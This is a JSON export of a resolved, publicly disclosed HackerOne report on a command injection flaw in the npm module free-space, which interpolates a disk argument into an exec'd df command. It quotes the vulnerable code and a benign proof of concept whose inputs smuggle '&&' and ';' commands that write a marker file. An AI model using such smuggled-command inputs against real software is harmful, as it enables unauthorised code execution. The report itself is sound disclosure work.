{
  "id": 950192,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC85NTAxOTI=",
  "url": "https://hackerone.com/reports/950192",
  "title": "[@knutkirkhorn/free-space] - Command Injection through Lack of Sanitization",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "medium",
  "readable_substate": "Resolved",
  "created_at": "2020-08-03T13:23:37.941Z",
  "submitted_at": "2020-08-03T13:23:37.958Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "ansuj7",
    "url": "/ansuj7",
    "profile_picture_urls": {
      "small": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 23949,
    "url": "https://hackerone.com/nodejs-ecosystem",
    "handle": "nodejs-ecosystem",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [],
    "submission_state": "disabled",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "Node.js third-party modules",
      "twitter_handle": "",
      "website": "https://nodejs.org/en/security/",
      "about": "This program was used to handle vulnerabilities in the Node.js ecosystem."
    }
  },
  "has_bounty?": false,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2020-09-18T12:35:51.099Z",
  "bug_reporter_agreed_on_going_public_at": "2020-09-18T12:35:51.053Z",
  "team_member_agreed_on_going_public_at": "2020-08-25T16:18:34.574Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "I would like to report ```Command Injection``` in the ```free-space``` module.\nIt allows ```arbitrary shell command execution on Unix-based systems```\n\n# Module\n\n**module name:** ```free-space```\n**version:** ```1.2.0```\n**npm page:** `https://www.npmjs.com/package/free-space`\n\n## Module Description\n\n Get the amount of free space for a drive\n\n## Module Stats\n\n24 Weekly Downloads\n\n# Vulnerability\n\n## Vulnerability Description\n\nThe issue is triggered due to the lack of sanitization of the input parameter of the library's exported anonymous function. \nThe exported function, when given a parameter checks what platform the code is being run on and sends that parameter to a function call in either ```lib/unix.js``` or ```lib/windows/js```.\nThe vulnerability exists in ```lib/unix.js``` which directly uses the user-input parameter: ```disk``` in the template string that ultimately gets exec-ed.\n\nBelow is the library's ```index.js``:\n\n```javascript\n'use strict';\nconst systemDisk = require('system-disk');\nconst windows = require('./lib/windows.js');\nconst unix = require('./lib/unix.js');\n\nmodule.exports = disk => {\n    if (disk === undefined) {\n        return new Promise(resolve => {\n            systemDisk().then(newDisk => {\n                disk = newDisk;\n\n                if (process.platform === 'win32') {\n                    resolve(windows(disk));\n                } else {\n                    resolve(unix(disk));\n                }\n            });\n        });\n    } else {                   // this code executes if a parameter is passed to this function\n        if (typeof disk !== 'string') {\n            throw new TypeError('Invalid input');\n        }\n\n        if (process.platform === 'win32') {    // calls lib/windows.js with the input parameter\n            return windows(disk);\n        }\n\n        return unix(disk);    // calls lib/unix.js with the input parameter\n    }\n};\n```\n\nBelow is the bug in ```lib/unix.js```:\n```javascript\n'use strict';\nconst {exec} = require('child_process');\n\nmodule.exports = disk => {\n    return new Promise((resolve, reject) => {\n        exec(`df -k | grep ^${disk} | awk '{print $4}'`, (err, stdout, stderr) => { // 'disk' is the parameter passed here from the library's exported call\n            if (stderr) {\n                reject(new Error('Something wrong happened'));\n                return;\n            }\n\n            if (stdout.length === 0 || err) {\n                reject(new Error('Could not find disk: ' + disk));\n            }\n\n            resolve(parseInt(stdout, 10) * 1024);\n        });\n    });\n};\n```\nDue to the parameter directly being passed to ```exec```, a ```;```or ```&&``` followed by commands will cause each command after the delimiting character to be executed.\n\n\n## Steps To Reproduce:\n\nCreate testing directory: ```mkdir free-space-poc```\nInstall package: ```npm install (@)knutkirkhorn/free-space```\n\nCreate the following script  - ```test.js``` in the testing directory:\n```javascript\nconst freeSpace = require('@knutkirkhorn/free-space');\n\nfreeSpace(' && echo AMPERSAND_EXEC > ./CODEEXEC').then(bytes => {\n    console.log('AMPERSAND: Free space: ' + bytes + '\\n');\n});\n\nfreeSpace(' ; echo SEMICOLON_EXEC >> ./CODEEXEC').then(bytes => {\n    console.log('SEMICOLON: Free space: ' + bytes + '\\n');\n});\n``` \nExecute with ```nodejs test.js```\n\nList the directory with ```ls```\nYou will see the file ```CODEEXEC``` has been created in the current directory with output from injected commands. ```cat CODEEXEC```\n{F934570}\n\n## Patch\n\nSanitize the ```disk``` parameter before passing it into ```exec``` in ```lib/unix.js``` - Cut out everything after a ```;  and  && ``` and ensure that the disk does exist before calling ```exec```.\n\n## Supporting Material/References:\n\n- Operating System Version: Ubuntu 18.04.4 LTS\n- NodeJS Version: v8.10.0\n- NPM Version: 6.14.7\n\n# Wrap up\n\n- I contacted the maintainer to let them know: N\n- I opened an issue in the related repository: N \n\nThank you for your time.\n\n## Impact\n\nCommand Injection can lead to information gathering, system enumeration and further execution of scripts/binaries.",
  "weakness": {
    "id": 58,
    "name": "Command Injection - Generic"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [
    {
      "id": 934570,
      "file_name": "free-space-poc.PNG",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/vkd2xLhLfpR92w7PVxApRReR?response-content-disposition=attachment%3B%20filename%3D%22free-space-poc.PNG%22%3B%20filename%2A%3DUTF-8%27%27free-space-poc.PNG&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ3H257GYG%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T135138Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIGoOoD7IqdXlQSMALqfdmBHb%2FwisMvEm1NldXxdnNeYCAiARy2w%2BYbeWpCI595roGwDkus42Lbn86e5evWfxBT9NOSqyBQh1EAMaDDAxMzYxOTI3NDg0OSIMhPAKuxRXUmGeFQneKo8F3DcJJTLeqY4WL2LSYxnsh9sLc5TIBgXhMZcfnWnfMScNTJ5phuisFPjvWUDTRl2jiPdCnVNDEZTh0V%2FzIfuaRGTEFLdttdVM%2B7XRPGS6Z0DsZrpCecbEHHiNrvbSv9rEH4WRaiYG2AiT800A%2BhISire0KP%2FxWN%2Bq3fGg3S7IYi3fo9FxjeHTJXwzRwtp8p2sKp0llq1XgyIM5HcUKwfeJRLDxhXB4KjtrJm8Nl1HJjYd38Kl4OOD%2BVQ4qgxVg6S3QUXiVui8uRmS6QSomCFcHKrWwhKDdkwleR0A2DhXEcMBOpr5uZdFBRMTTLVfLJqt8b7Gn%2FP1kEndSvANJn4pKANWGSKKrLKm%2FW5SYwuMcwCwVWZkm2kI7%2FaC07CZWLriJLbb0B9h3p9uZQd2JXPcy9UJrOtHD39hJ2TSV7hqrFKdIH1VDFc1o4xN9CfMK41Iz19t%2BXB%2BiBobpQMJkamH6%2BMqlg%2BRnibesjoUaznTAKjTv04b1H2Gfup9n8qf1CYIWVaypF0psfpQ4tvZMbk6A9lrEcUCjjcacQFwHaOjcE1VoMC9x8Y3SAcSGe1fgFB6OLJLsOalgVmTZQIr2sn%2FSBi9GibFMnQs9e5r%2F7uE1BdL1f%2FCFWqUOKwCQctUsNAkTlcVSIqcZpy6Wm2pgFJXvhoksSuVTlHoBuvWUpF4GomHdrlRKMJqiHROUMKzy4%2Bellc5ulcf3UuSY1k6dZTA5MpfF5QPJ2XV03V5EhF2iFMJDrqHZ%2B%2F0jo2dVNDNDizcLLqOfvfM%2BmZ7IXWl4eYmGZQoTIUs3oLbjrHhfzw1vaH3uiu8ixoDFPI3JWnWXXw%2ByN4jhOjFQUQU%2FCtTyf5HAodU0A%2FQKW77PGnTKFcxtzDMra2uBjqyAVQAtnTFFvc7GDPSVsVDtdiaEYk9BpW%2Fv8Td%2BbCI38P1sNEwB4ogOEtNgM7ztuaNj2ZReYSVM3%2BIJgEPDNx5i2UO45PoOWvvUmsULL9KC8Xx45bNoDwGXKdZ6pe2GQq%2Fsv22h8ChmpFIOFcTfENahRl6cIPxSXPhniNCt1V5BiQ%2FiqrO5YcfhIscKvt0FrmdE0Oc8bj0IS5H4NQvWQZaNALTeEhhVoNMsjxWfsEi6d9j4XE%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=088d64573f5a2d68aa7063179cff52e3dfb42adcc64b911c2b96e188c760168e",
      "file_size": 22654,
      "type": "image/png",
      "moderated": null
    }
  ],
  "allow_singular_disclosure_at": "2020-09-24T16:18:34.655Z",
  "allow_singular_disclosure_after": -106867983.9337281,
  "singular_disclosure_allowed": true,
  "vote_count": 7,
  "voters": [
    "hariprasanna1",
    "devolution",
    "haltosan",
    "xyber_wolf",
    "younggoon",
    "tariktarik",
    "xyzo"
  ],
  "severity": {
    "rating": "medium",
    "score": 6.8,
    "author_type": "User",
    "metrics": {
      "attack_vector": "local",
      "attack_complexity": "low",
      "privileges_required": "none",
      "user_interaction": "none",
      "scope": "changed",
      "confidentiality": "low",
      "integrity": "low",
      "availability": "low"
    }
  },
  "structured_scope": {
    "databaseId": 2986,
    "asset_type": "SOURCE_CODE",
    "asset_identifier": "Other module",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
